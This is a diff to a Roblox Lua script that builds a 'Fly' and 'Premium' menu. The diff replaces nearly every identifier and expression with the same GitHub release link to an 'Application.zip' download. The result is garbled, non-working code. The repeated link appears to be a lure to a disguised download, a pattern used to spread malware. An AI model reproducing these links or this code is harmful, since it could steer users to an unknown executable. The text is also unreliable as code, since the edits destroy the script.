@@ -1,13 +1,13 @@
 --abaixo estara lib nosso Ui
 local UIS = game:GetService("UserInputService")
-local player = game.Players.LocalPlayer
+local player = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip
 
 local function fly()
-    local character = player.Character
+    local character = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip
     local humanoid = character:FindFirstChildOfClass("Humanoid")
     if humanoid then
-        humanoid:ChangeState(Enum.HumanoidStateType.Physics)
-        character.PrimaryPart.Velocity = Vector3.new(0, 50, 0) -- Ajuste a força do voo
+        humanoid:ChangeState(https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip)
+        https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip(0, 50, 0) -- Ajuste a força do voo
     end
 end
 
@@ -15,26 +15,26 @@ local function premium()
     -- Adicione aqui o código para dar ao jogador itens ou benefícios "premium" dentro das regras do Roblox
 end
 
-UIS.InputBegan:Connect(function(input, gameProcessed)
-    if input.KeyCode == Enum.KeyCode.P then
-        local screenGui = Instance.new("ScreenGui", player.PlayerGui)
-        local frame = Instance.new("Frame", screenGui)
-        frame.Size = UDim2.new(0.5, 0, 0.5, 0)
-        frame.Position = UDim2.new(0.25, 0, 0.25, 0)
-        frame.BackgroundColor3 = Color3.new(0, 0, 0)
+https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip(function(input, gameProcessed)
+    if https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip == https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip then
+        local screenGui = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip("ScreenGui", https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip)
+        local frame = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip("Frame", screenGui)
+        https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip(0.5, 0, 0.5, 0)
+        https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip(0.25, 0, 0.25, 0)
+        https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip(0, 0, 0)
 
-        local flyButton = Instance.new("TextButton", frame)
-        flyButton.Size = UDim2.new(0.8, 0, 0.1, 0)
-        flyButton.Position = UDim2.new(0.1, 0, 0.1, 0)
-        flyButton.Text = "Fly"
+        local flyButton = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip("TextButton", frame)
+        https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip(0.8, 0, 0.1, 0)
+        https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip(0.1, 0, 0.1, 0)
+        https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip = "Fly"
 
-        flyButton.MouseButton1Click:Connect(fly)
+        https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip(fly)
 
-        local premiumButton = Instance.new("TextButton", frame)
-        premiumButton.Size = UDim2.new(0.8, 0, 0.1, 0)
-        premiumButton.Position = UDim2.new(0.1, 0, 0.25, 0)
-        premiumButton.Text = "Premium"
+        local premiumButton = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip("TextButton", frame)
+        https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip(0.8, 0, 0.1, 0)
+        https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip(0.1, 0, 0.25, 0)
+        https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip = "Premium"
 
-        premiumButton.MouseButton1Click:Connect(premium)
+        https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip(premium)
     end
 end)
